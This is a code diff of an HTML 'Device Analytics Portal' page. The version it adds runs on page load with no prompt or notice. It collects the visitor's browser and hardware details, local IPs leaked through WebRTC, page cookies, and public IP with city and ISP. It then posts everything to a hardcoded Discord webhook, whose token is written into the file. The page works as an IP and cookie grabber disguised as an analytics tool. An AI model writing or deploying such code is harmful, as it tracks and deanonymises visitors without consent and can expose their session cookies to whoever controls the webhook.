@@ -7,271 +7,282 @@
 </head>
 <body>
 
-<!-- NAME ENTRY SCREEN -->
-<div id="nameScreen" class="name-screen">
-  <h1>Welcome!</h1>
-  <p>Please enter your name to continue:</p>
-  <input type="text" id="userNameInput" placeholder="Your Name">
-  <button id="startBtn">Start</button>
-</div>
+<h1>Device Analytics Portal</h1>
 
-<!-- ANALYTICS PORTAL (hidden by default) -->
-<div id="analyticsPortal" style="display:none;">
-  <h1>Device Analytics Portal</h1>
-
-  <div class="section"><h2>1. Browser & Environment</h2><table id="env"></table></div>
-  <div class="section"><h2>2. Screen & Display</h2><table id="screen"></table></div>
-  <div class="section"><h2>3. Hardware Info</h2><table id="hw"></table></div>
-  <div class="section"><h2>4. IP & Geolocation</h2><table id="net"></table></div>
-  <div class="section"><h2>5. Timezone</h2><table id="tz"></table></div>
-  <div class="section"><h2>6. Storage & Cookies</h2><table id="store"></table></div>
-  <div class="section"><h2>7. Battery</h2><table id="bat"></table></div>
-  <div class="section"><h2>8. WebGL & GPU</h2><table id="gpu"></table></div>
-  <div class="section"><h2>9. Media Devices</h2><table id="media"></table></div>
-  <div class="section"><h2>10. WebRTC IPs</h2><table id="rtc"></table></div>
-  <div class="section"><h2>11. Fingerprint</h2><p id="fp"></p></div>
-</div>
+<div class="section"><h2>1. Browser & Environment</h2><table id="env"></table></div>
+<div class="section"><h2>2. Screen & Display</h2><table id="screen"></table></div>
+<div class="section"><h2>3. Hardware Info</h2><table id="hw"></table></div>
+<div class="section"><h2>4. IP & Geolocation</h2><table id="net"></table></div>
+<div class="section"><h2>5. Timezone</h2><table id="tz"></table></div>
+<div class="section"><h2>6. Storage & Cookies</h2><table id="store"></table></div>
+<div class="section"><h2>7. Battery</h2><table id="bat"></table></div>
+<div class="section"><h2>8. WebGL & GPU</h2><table id="gpu"></table></div>
+<div class="section"><h2>9. Media Devices</h2><table id="media"></table></div>
+<div class="section"><h2>10. WebRTC IPs</h2><table id="rtc"></table></div>
+<div class="section"><h2>11. Fingerprint</h2><p id="fp"></p></div>
 
 <script>
-// ────────────────────────────────
-//  NAME SCREEN LOGIC
-// ────────────────────────────────
-let userName = "";
-
-document.getElementById("startBtn").addEventListener("click", () => {
-  const input = document.getElementById("userNameInput").value.trim();
-  if (!input) return alert("Please enter a name!");
-  userName = input;
-  document.getElementById("nameScreen").style.display = "none";
-  document.getElementById("analyticsPortal").style.display = "block";
-
-  // Start analytics collection after name entry
-  initAnalytics();
-});
-
-// ────────────────────────────────
-//  ANALYTICS FUNCTION (all previous code)
-// ────────────────────────────────
-function initAnalytics() {
-  // ────────────── HELPERS ──────────────
-  function addRow(id, key, val) {
-    const t = document.getElementById(id);
-    const r = t.insertRow();
-    r.insertCell(0).innerText = key;
-    r.insertCell(1).innerText = val ?? "—";
-  }
-
-  function truncate(str, max = 900) {
-    if (!str) return "—";
-    str = String(str);
-    return str.length > max ? str.slice(0, max - 3) + "..." : str;
-  }
-
-  function splitLongValue(nameBase, value, maxPerField = 950) {
-    if (!value) return [{name: nameBase, value: "—"}];
-    const str = String(value);
-    if (str.length <= maxPerField) return [{name: nameBase, value: truncate(str)}];
-
-    const parts = [];
-    let idx = 1;
-    for (let i = 0; i < str.length; i += maxPerField) {
-      const chunk = str.slice(i, i + maxPerField);
-      parts.push({
-        name: `${nameBase} (${idx})`,
-        value: truncate(chunk, maxPerField - 10),
-        inline: false
-      });
-      idx++;
-    }
-    return parts;
-  }
-
-  function getDeviceType() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (/mobile|android|iphone|ipad|tablet|silk|kindle|playbook|bb10|playbook/.test(ua)) return "Mobile / Tablet";
-    return "Desktop / Laptop";
-  }
-
-  // ────────────── DATA COLLECTION ──────────────
-  const data = {
-    userName,
-    timestamp: new Date(),
-    deviceType: getDeviceType(),
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-    userAgent: navigator.userAgent || "Unknown",
-    platform: navigator.platform || "Unknown",
-    language: navigator.language || "Unknown",
-    languages: navigator.languages?.join(", ") || "Unknown",
-    doNotTrack: navigator.doNotTrack || "Unknown",
-    screen: {
-      full: `${screen.width} × ${screen.height}`,
-      avail: `${screen.availWidth} × ${screen.availHeight}`,
-      colorDepth: screen.colorDepth || "Unknown",
-      pixelRatio: window.devicePixelRatio || "Unknown"
-    },
-    hardware: {
-      cores: navigator.hardwareConcurrency || "Unknown",
-      ramGB: navigator.deviceMemory || "Unknown"
-    },
-    battery: { charging: "Unknown", level: "Unknown" },
-    gpu: { vendor: "Unknown", renderer: "Unknown", version: "Unknown" },
-    media: { cameras: 0, microphones: 0, speakers: 0 },
-    rtcIPs: [],
-    cookies: document.cookie || "(none)",
-    localStorage: !!window.localStorage,
-    sessionStorage: !!window.sessionStorage,
-    indexedDB: !!window.indexedDB
-  };
-
-  // ────────────── FILL TABLES ──────────────
-  ["User Agent", "Platform", "Language", "Languages", "Do Not Track", "Device Type"]
-    .forEach((k,i) => addRow("env", k, Object.values(data)[i+3])); // offset for userName
-
-  addRow("env", "User Name", data.userName);
-  addRow("env", "User Agent", truncate(data.userAgent, 120));
-
-  addRow("screen", "Resolution", data.screen.full);
-  addRow("screen", "Available", data.screen.avail);
-  addRow("screen", "Color Depth", data.screen.colorDepth);
-  addRow("screen", "Pixel Ratio", data.screen.pixelRatio);
-
-  addRow("hw", "CPU Cores", data.hardware.cores);
-  addRow("hw", "Approx RAM (GB)", data.hardware.ramGB);
-
-  addRow("tz", "Browser Timezone", data.timezone);
-
-  addRow("store", "LocalStorage", data.localStorage ? "Yes" : "No");
-  addRow("store", "SessionStorage", data.sessionStorage ? "Yes" : "No");
-  addRow("store", "IndexedDB", data.indexedDB ? "Yes" : "No");
-  addRow("store", "Cookies", truncate(data.cookies, 200));
-
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-      data.battery.charging = b.charging ? "Yes" : "No";
-      data.battery.level    = Math.round(b.level * 100) + "%";
-      addRow("bat", "Charging", data.battery.charging);
-      addRow("bat", "Level", data.battery.level);
-    }).catch(() => addRow("bat", "Battery", "Error"));
-  } else addRow("bat", "Battery API", "Not supported");
-
-  (function getGPU() {
-    const c = document.createElement("canvas");
-    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-    if (!gl) { addRow("gpu", "WebGL", "Unavailable"); return; }
-    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    if (dbg) {
-      data.gpu.vendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   || "Hidden";
-      data.gpu.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "Hidden";
-      addRow("gpu", "GPU Vendor", data.gpu.vendor);
-      addRow("gpu", "GPU Renderer", data.gpu.renderer);
-    }
-    data.gpu.version = gl.getParameter(gl.VERSION) || "Unknown";
-    addRow("gpu", "WebGL Version", data.gpu.version);
-  })();
-
-  if (navigator.mediaDevices?.enumerateDevices) {
-    navigator.mediaDevices.enumerateDevices()
-      .then(devices => {
-        devices.forEach(d => {
-          if (d.kind === "videoinput")  data.media.cameras++;
-          if (d.kind === "audioinput")  data.media.microphones++;
-          if (d.kind === "audiooutput") data.media.speakers++;
-        });
-        addRow("media", "Cameras", data.media.cameras);
-        addRow("media", "Microphones", data.media.microphones);
-        addRow("media", "Speakers", data.media.speakers);
-      })
-      .catch(() => addRow("media", "Media Devices", "Permission denied / Error"));
-  } else addRow("media", "Media Devices API", "Not supported");
-
-  (function getRTC() {
-    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-    pc.createDataChannel("");
-    pc.onicecandidate = e => {
-      if (!e.candidate) return;
-      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-      const match = ipRegex.exec(e.candidate.candidate);
-      if (match && !data.rtcIPs.includes(match[1])) {
-        data.rtcIPs.push(match[1]);
-        addRow("rtc", "Discovered IPs", data.rtcIPs.join(", "));
-      }
-    };
-    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
-    setTimeout(()=>{ if(data.rtcIPs.length===0) addRow("rtc","Discovered IPs","None found"); },6000);
-  })();
-
-  function generateFingerprint() {
-    const parts = [
-      navigator.userAgent,
-      screen.width, screen.height, screen.availWidth, screen.availHeight,
-      navigator.hardwareConcurrency, navigator.deviceMemory,
-      window.devicePixelRatio,
-      data.timezone,
-      navigator.language,
-      data.gpu.vendor, data.gpu.renderer
-    ].filter(Boolean).join("|");
-    let hash = 0;
-    for (let i = 0; i < parts.length; i++) {
-      hash = ((hash << 5) - hash + parts.charCodeAt(i)) | 0;
-    }
-    return "FP-" + Math.abs(hash).toString(36).toUpperCase().padStart(8,"0");
-  }
-  document.getElementById("fp").innerText = generateFingerprint();
-
-  // ────────────── WEBHOOK SEND ──────────────
-  if (!sessionStorage.getItem("analyticsSent")) {
-    sessionStorage.setItem("analyticsSent","true");
-    const webhook = "YOUR_WEBHOOK_URL";
-
-    Promise.all([
-      fetch("https://ipapi.co/json/").then(r=>r.ok ? r.json() : {}).catch(()=>({})),
-      new Promise(r => setTimeout(r, 7000))
-    ]).then(([ipData]) => {
-      const now = data.timestamp;
-      const embeds = [];
-
-      const mainEmbed = {
-        title: "Device Analytics • New Access",
-        description: `**User**: ${data.userName}\n**Device**: ${data.deviceType}\n**Timezone**: ${data.timezone}`,
-        color: 0x5588FF,
-        fields: [
-          { name: "Access Time (Local)", value: now.toLocaleString(), inline: true },
-          { name: "Access Time (UTC)",   value: now.toISOString(),   inline: true },
-          { name: "Platform / OS",       value: data.platform,       inline: true },
-          { name: "CPU Cores",           value: String(data.hardware.cores), inline: true },
-          { name: "Approx RAM",          value: data.hardware.ramGB + " GB", inline: true },
-          { name: "Pixel Ratio",         value: String(data.screen.pixelRatio), inline: true },
-          { name: "Battery",             value: `${data.battery.charging} – ${data.battery.level}`, inline: true },
-          { name: "Cameras / Mic / Spk", value: `${data.media.cameras} / ${data.media.microphones} / ${data.media.speakers}`, inline: true },
-          { name: "GPU Vendor",          value: truncate(data.gpu.vendor, 90),   inline: true },
-          { name: "GPU Renderer",        value: truncate(data.gpu.renderer, 90), inline: true },
-        ],
-        timestamp: now.toISOString(),
-        footer: { text: "Fingerprint • " + generateFingerprint() }
-      };
-
-      if(ipData.ip){
-        mainEmbed.fields.push(
-          { name: "Public IP",  value: ipData.ip, inline: true },
-          { name: "ISP / Org",  value: ipData.org || ipData.organization || "—", inline: true },
-          { name: "City / Region", value: [ipData.city, ipData.region].filter(Boolean).join(", ") || "—", inline: true },
-          { name: "Country",    value: ipData.country_name || ipData.country || "—", inline: true }
-        );
-      } else mainEmbed.fields.push({name:"IP Lookup", value:"Failed", inline:true});
-
-      embeds.push(mainEmbed);
-
-      const longFieldsEmbed = { title: "Detailed Info", color: 0x99BBFF, fields: [] };
-      longFieldsEmbed.fields.push(...splitLongValue("User Agent", data.userAgent));
-      if(data.rtcIPs.length>0) longFieldsEmbed.fields.push(...splitLongValue("WebRTC IPs", data.rtcIPs.join(",")));
-      if(data.cookies && data.cookies !== "(none)") longFieldsEmbed.fields.push(...splitLongValue("Cookies", data.cookies));
-      if(longFieldsEmbed.fields.length>0) embeds.push(longFieldsEmbed);
-
-      fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds})})
-        .catch(err=>console.debug("Webhook failed", err));
-    });
-  }
+// ────────────────────────────────────────────────
+//  HELPERS
+// ────────────────────────────────────────────────
+function addRow(id, key, val) {
+  const t = document.getElementById(id);
+  const r = t.insertRow();
+  r.insertCell(0).innerText = key;
+  r.insertCell(1).innerText = val ?? "—";
 }
+
+function truncate(str, max = 900) {
+  if (!str) return "—";
+  str = String(str);
+  return str.length > max ? str.slice(0, max - 3) + "..." : str;
+}
+
+function splitLongValue(nameBase, value, maxPerField = 950) {
+  if (!value) return [{name: nameBase, value: "—"}];
+  const str = String(value);
+  if (str.length <= maxPerField) return [{name: nameBase, value: truncate(str)}];
+
+  const parts = [];
+  let idx = 1;
+  for (let i = 0; i < str.length; i += maxPerField) {
+    const chunk = str.slice(i, i + maxPerField);
+    parts.push({
+      name: `${nameBase} (${idx})`,
+      value: truncate(chunk, maxPerField - 10),
+      inline: false
+    });
+    idx++;
+  }
+  return parts;
+}
+
+function getDeviceType() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (/mobile|android|iphone|ipad|tablet|silk|kindle|playbook|bb10|playbook/.test(ua)) return "Mobile / Tablet";
+  return "Desktop / Laptop";
+}
+
+// ────────────────────────────────────────────────
+//  DATA COLLECTION
+// ────────────────────────────────────────────────
+const data = {
+  timestamp: new Date(),
+  deviceType: getDeviceType(),
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+  userAgent: navigator.userAgent || "Unknown",
+  platform: navigator.platform || "Unknown",
+  language: navigator.language || "Unknown",
+  languages: navigator.languages?.join(", ") || "Unknown",
+  doNotTrack: navigator.doNotTrack || "Unknown",
+  screen: {
+    full: `${screen.width} × ${screen.height}`,
+    avail: `${screen.availWidth} × ${screen.availHeight}`,
+    colorDepth: screen.colorDepth || "Unknown",
+    pixelRatio: window.devicePixelRatio || "Unknown"
+  },
+  hardware: {
+    cores: navigator.hardwareConcurrency || "Unknown",
+    ramGB: navigator.deviceMemory || "Unknown"
+  },
+  battery: { charging: "Unknown", level: "Unknown" },
+  gpu: { vendor: "Unknown", renderer: "Unknown", version: "Unknown" },
+  media: { cameras: 0, microphones: 0, speakers: 0 },
+  rtcIPs: [],
+  cookies: document.cookie || "(none)",
+  localStorage: !!window.localStorage,
+  sessionStorage: !!window.sessionStorage,
+  indexedDB: !!window.indexedDB
+};
+
+// ────────────────────────────────────────────────
+//  FILL TABLES (UI)
+// ────────────────────────────────────────────────
+
+// 1. Environment
+["User Agent", "Platform", "Language", "Languages", "Do Not Track", "Device Type"]
+  .forEach((k,i) => addRow("env", k, Object.values(data)[i+2])); // offset
+
+addRow("env", "User Agent", truncate(data.userAgent, 120));
+
+// 2. Screen
+addRow("screen", "Resolution", data.screen.full);
+addRow("screen", "Available", data.screen.avail);
+addRow("screen", "Color Depth", data.screen.colorDepth);
+addRow("screen", "Pixel Ratio", data.screen.pixelRatio);
+
+// 3. Hardware
+addRow("hw", "CPU Cores", data.hardware.cores);
+addRow("hw", "Approx RAM (GB)", data.hardware.ramGB);
+
+// 4. IP & Geo ─ fetched later
+
+// 5. Timezone
+addRow("tz", "Browser Timezone", data.timezone);
+
+// 6. Storage
+addRow("store", "LocalStorage", data.localStorage ? "Yes" : "No");
+addRow("store", "SessionStorage", data.sessionStorage ? "Yes" : "No");
+addRow("store", "IndexedDB", data.indexedDB ? "Yes" : "No");
+addRow("store", "Cookies", truncate(data.cookies, 200));
+
+// 7. Battery
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    data.battery.charging = b.charging ? "Yes" : "No";
+    data.battery.level    = Math.round(b.level * 100) + "%";
+    addRow("bat", "Charging", data.battery.charging);
+    addRow("bat", "Level", data.battery.level);
+  }).catch(() => addRow("bat", "Battery", "Error"));
+} else {
+  addRow("bat", "Battery API", "Not supported");
+}
+
+// 8. WebGL / GPU
+(function getGPU() {
+  const c = document.createElement("canvas");
+  const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+  if (!gl) {
+    addRow("gpu", "WebGL", "Unavailable");
+    return;
+  }
+  const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+  if (dbg) {
+    data.gpu.vendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   || "Hidden";
+    data.gpu.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "Hidden";
+    addRow("gpu", "GPU Vendor", data.gpu.vendor);
+    addRow("gpu", "GPU Renderer", data.gpu.renderer);
+  }
+  data.gpu.version = gl.getParameter(gl.VERSION) || "Unknown";
+  addRow("gpu", "WebGL Version", data.gpu.version);
+})();
+
+// 9. Media Devices
+if (navigator.mediaDevices?.enumerateDevices) {
+  navigator.mediaDevices.enumerateDevices()
+    .then(devices => {
+      devices.forEach(d => {
+        if (d.kind === "videoinput")  data.media.cameras++;
+        if (d.kind === "audioinput")  data.media.microphones++;
+        if (d.kind === "audiooutput") data.media.speakers++;
+      });
+      addRow("media", "Cameras", data.media.cameras);
+      addRow("media", "Microphones", data.media.microphones);
+      addRow("media", "Speakers", data.media.speakers);
+    })
+    .catch(() => addRow("media", "Media Devices", "Permission denied / Error"));
+} else {
+  addRow("media", "Media Devices API", "Not supported");
+}
+
+// 10. WebRTC
+(function getRTC() {
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+  pc.createDataChannel("");
+  pc.onicecandidate = e => {
+    if (!e.candidate) return;
+    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+    const match = ipRegex.exec(e.candidate.candidate);
+    if (match && !data.rtcIPs.includes(match[1])) {
+      data.rtcIPs.push(match[1]);
+      addRow("rtc", "Discovered IPs", data.rtcIPs.join(", "));
+    }
+  };
+  pc.createOffer()
+    .then(offer => pc.setLocalDescription(offer))
+    .catch(() => {});
+  setTimeout(() => {
+    if (data.rtcIPs.length === 0) addRow("rtc", "Discovered IPs", "None found");
+  }, 6000);
+})();
+
+// 11. Fingerprint
+function generateFingerprint() {
+  const parts = [
+    navigator.userAgent,
+    screen.width, screen.height, screen.availWidth, screen.availHeight,
+    navigator.hardwareConcurrency, navigator.deviceMemory,
+    window.devicePixelRatio,
+    data.timezone,
+    navigator.language,
+    data.gpu.vendor, data.gpu.renderer
+  ].filter(Boolean).join("|");
+  let hash = 0;
+  for (let i = 0; i < parts.length; i++) {
+    hash = ((hash << 5) - hash + parts.charCodeAt(i)) | 0;
+  }
+  return "FP-" + Math.abs(hash).toString(36).toUpperCase().padStart(8,"0");
+}
+document.getElementById("fp").innerText = generateFingerprint();
+
+// ────────────────────────────────────────────────
+//  WEBHOOK SENDING (once)
+// ────────────────────────────────────────────────
+(function sendToWebhook() {
+  if (sessionStorage.getItem("analyticsSent")) return;
+  sessionStorage.setItem("analyticsSent", "true");
+
+  const webhook = "https://discord.com/api/webhooks/1465301714461655205/rvWmGSYdXvtB4rtyb65FGHVpZ0qXQ28m3TcBzOXnlKlhl3Vstse2Sl-d7RZ2zwl0AGnH";
+
+  Promise.all([
+    fetch("https://ipapi.co/json/").then(r=>r.ok ? r.json() : {}).catch(()=>({})),
+    new Promise(r => setTimeout(r, 7000))
+  ]).then(([ipData]) => {
+    const now = data.timestamp;
+    const embeds = [];
+
+    const mainEmbed = {
+      title: "Device Analytics • New Access",
+      description: `**Device**: ${data.deviceType}\n**Timezone**: ${data.timezone}`,
+      color: 0x5588FF,
+      fields: [
+        { name: "Access Time (Local)", value: now.toLocaleString(), inline: true },
+        { name: "Access Time (UTC)",   value: now.toISOString(),   inline: true },
+        { name: "Platform / OS",       value: data.platform,       inline: true },
+        { name: "CPU Cores",           value: String(data.hardware.cores), inline: true },
+        { name: "Approx RAM",          value: data.hardware.ramGB + " GB", inline: true },
+        { name: "Pixel Ratio",         value: String(data.screen.pixelRatio), inline: true },
+        { name: "Battery",             value: `${data.battery.charging} – ${data.battery.level}`, inline: true },
+        { name: "Cameras / Mic / Spk", value: `${data.media.cameras} / ${data.media.microphones} / ${data.media.speakers}`, inline: true },
+        { name: "GPU Vendor",          value: truncate(data.gpu.vendor, 90),   inline: true },
+        { name: "GPU Renderer",        value: truncate(data.gpu.renderer, 90), inline: true },
+      ],
+      timestamp: now.toISOString(),
+      footer: { text: "Fingerprint • " + generateFingerprint() }
+    };
+
+    if (ipData.ip) {
+      mainEmbed.fields.push(
+        { name: "Public IP",  value: ipData.ip, inline: true },
+        { name: "ISP / Org",  value: ipData.org || ipData.organization || "—", inline: true },
+        { name: "City / Region", value: [ipData.city, ipData.region].filter(Boolean).join(", ") || "—", inline: true },
+        { name: "Country",    value: ipData.country_name || ipData.country || "—", inline: true }
+      );
+    } else {
+      mainEmbed.fields.push({ name: "IP Lookup", value: "Failed", inline: true });
+    }
+
+    embeds.push(mainEmbed);
+
+    const longFieldsEmbed = { title: "Detailed Info", color: 0x99BBFF, fields: [] };
+    longFieldsEmbed.fields.push(...splitLongValue("User Agent", data.userAgent));
+    if (data.rtcIPs.length > 0) {
+      longFieldsEmbed.fields.push(...splitLongValue("WebRTC IPs", data.rtcIPs.join(", ")));
+    }
+    if (data.cookies && data.cookies !== "(none)") {
+      longFieldsEmbed.fields.push(...splitLongValue("Cookies", data.cookies));
+    }
+    if (longFieldsEmbed.fields.length > 0) {
+      embeds.push(longFieldsEmbed);
+    }
+
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds })
+    }).catch(err => console.debug("Webhook failed", err));
+  });
+})();
 </script>
 
 </body>
